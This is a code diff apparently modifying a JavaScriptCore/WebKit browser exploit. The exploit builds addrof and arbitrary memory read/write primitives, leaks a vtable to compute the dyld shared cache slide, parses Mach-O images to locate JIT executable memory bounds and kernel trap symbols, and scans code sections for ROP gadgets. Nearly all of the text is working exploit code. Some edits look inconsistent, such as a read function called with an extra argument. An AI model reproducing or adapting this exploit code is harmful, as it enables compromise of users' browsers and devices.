@@ -57,8 +57,8 @@ function off2addr(segs, off)
             var end   = Add(start, segs[i].size);
             if
             (
-                (start < off || start <= off) &&
-                (end > off)
+                (start.hi() < off.hi() || (start.hi() == off.hi() && start.lo() <= off.lo())) &&
+                (end.hi() > off.hi() || (end.hi() == off.hi() && end.lo() > off.lo()))
             )
             {
                 return Add(segs[i].addr, Sub(off, start));
@@ -482,13 +482,15 @@ function exploit(){
                 var writer = this.create_writer(addrObj);
                 writer.write_i8(offset, value);
             },
-            copyto: function(addrObj, offset, data, length) {
+            write: function(addrObj, data, length) {
+                var offset = 0;
                 var writer = this.create_writer(addrObj);
                 for (var i = 0; i < length; i++) {
                     writer.write_i8(offset + i, data[i]);
                 }
             },
-            copyfrom: function(addrObj, offset, length) {
+            read: function(addrObj, length) {
+                var offset = 0;
                 var writer = this.create_writer(addrObj);
                 var arr = new Uint8Array(length);
                 for (var i = 0; i < length; i++) {
@@ -496,24 +498,6 @@ function exploit(){
                 }
                 return arr;
             },
-            read: function(addr, length) {
-                var a = new Uint8Array(length);
-            var i;
-
-            for (i = 0; i + 8 < length; i += 8) {
-                v = this.read_i64(addr + i,0).bytes()
-                for (var j = 0; j < 8; j++) {
-                    a[i+j] = v[j];
-                }
-            }
-
-            v = this.read_i64(addr + i,0).bytes()
-            for (var j = i; j < length; j++) {
-                a[j] = v[j - i];
-            }
-
-            return a
-            }
         }
         var r32 = function(addr){
             addr= new Int64(addr);
@@ -522,6 +506,7 @@ function exploit(){
         log('[*] Creating the HTMLDivElement wrapper...');
         var d = document.createElement('div');
         let ad_div = addrof(d);
+        log(ad_div.lo() + ad_div.hi());
         log('[+] Address of the div is '+ad_div.toString(16));
         let exe_ptr = memory.read_i64(Add(ad_div, new Int64('0x18')),0);
         log('[+] Executable instance is at '+exe_ptr.toString(16));
@@ -531,17 +516,39 @@ function exploit(){
         var ccc = 0;
         var vtab = 0x1B205A808;
         var slide = Sub(v_tlb, vtab); 
-        var nslide = Sub(slide, new Int64('0x10'))
-        slide = 0;
-        log('[+] That means that the dyld shared cache slide should be '+nslide.toString(16));
+        var slide = Sub(slide, new Int64('0x10'));
+        log('[+] That means that the dyld shared cache slide should be '+slide.toString(16));
         //var base = Add(new Int64('0x1881BD000'), nslide);
         //log('[+] And thus the JavaScriptCore base is '+base.toString(16));
         //var magic =  r32(base);
         //log('[+] Which has magic '+magic.toString(16));
         function _u32(i)
     {
-        return b2u32(this.copyfrom(i,0,4));
+        return b2u32(this.read(i,4));
     }
+        
+        function _read(i, l)
+    {
+        if (i instanceof Int64) i = i.lo();
+        if (l instanceof Int64) l = l.lo();
+        if (i + l > this.length)
+        {
+            fail(`OOB read: ${i} -> ${i + l}, size: ${l}`);
+        }
+        return this.slice(i, i + l);
+    }
+
+    function _readInt64(addr)
+    {
+        return new Int64(this.read(addr, 8));
+    }
+
+    function _writeInt64(i, val)
+    {
+        if (i instanceof Int64) i = i.lo();
+        this.set(val.bytes(), i);
+    }
+
     memory.u32 = _u32;
         log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
         //tmp = base;
@@ -584,8 +591,8 @@ function exploit(){
             "/usr/lib/system/libsystem_kernel.dylib":                               ["_mach_task_self_", "__kernelrpc_mach_vm_protect_trap"],
             "/usr/lib/system/libsystem_c.dylib":                                    ["_usleep"],
             "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   [
-                "__ZN3JSC32startOfFixedExecutableMemoryPoolE",
-                "__ZN3JSC30endOfFixedExecutableMemoryPoolE",
+                "__ZN3JSC32taggedstartOfFixedExecutableMemoryPoolE",
+                "__ZN3JSC30taggedendOfFixedExecutableMemoryPoolE",
             ],
         };
 
@@ -640,31 +647,31 @@ function exploit(){
         var syms = {};
         var gadgets = {};
         var imgs  = Add(dcache_base, memory.u32(Add(dcache_base, 0x18)));
-        log(imgs)
+        log("cache images" + imgs)
         var nimgs = memory.u32(Add(dcache_base, 0x1c));
         //var nimgs = Add(dcache_base, memory.u32())
-        log(nimgs)
+        log("number of cache images = " + nimgs)
         for(var i = 0; i < nimgs; ++i)
         {
             var straddr = off2addr(dcache_segs, memory.u32(Add(imgs, i * 0x20 + 0x18)));
             var fn = function(i)
             {
-                return memory.copyfrom(Add(straddr, i),0,1)[0];
+                return memory.read(Add(straddr, i),1)[0];
             };
             var base = Add(memory.read_i32(Add(imgs, i * 0x20)),cache_slide);
-            log("base"+base)
+            log("base" + base)
             if(opcode_libs.some(lib => strcmp(fn, lib)))
             {
                 var ncmds = memory.u32(Add(base, 0x10));
                 for(var j = 0, off = 0x20; j < ncmds; ++j)
                 {
                     var cmd = memory.u32(Add(base, off));
-                    if(cmd == 0x19 && strcmp(memory.copyfrom(Add(base, off + 0x8),0, 0x10), "__TEXT")) // LC_SEGMENT_64
+                    if(cmd == 0x19 && strcmp(memory.read(Add(base, off + 0x8), 0x10), "__TEXT")) // LC_SEGMENT_64
                     {
                         var nsects = memory.u32(Add(base, off + 0x40));
                         for(var k = 0, o = off + 0x48; k < nsects; ++k)
                         {
-                            if(strcmp(memory.copyfrom(Add(base, o),0, 0x10), "__text"))
+                            if(strcmp(memory.read(Add(base, o), 0x10), "__text"))
                             {
                                 log("made it?")
                                 var keys = Object.keys(opcodes).filter(k=>!gadgets.hasOwnProperty[k])
@@ -676,7 +683,7 @@ function exploit(){
                                 }
 
                                 var addr = Add(memory.read_i64(Add(base, o + 0x20)), cache_slide)
-                                log("address"+addr)
+                                log("address" + addr)
                                 var size = memory.u32(Add(base, o + 0x28))
 
                                 // Copy the entire __text region into a Uint32Array for faster processing.
@@ -694,7 +701,7 @@ function exploit(){
                                     if (size - r < qty) {
                                         qty = size - r
                                     }
-                                    var data = memory.copyfrom(Add(addr, r),0, qty)
+                                    var data = memory.read(Add(addr, r),0, qty)
 
                                     // Data is an array of single bytes. This code takes four entries
                                     // and converts them into a single 32-bit integer. It then adds it
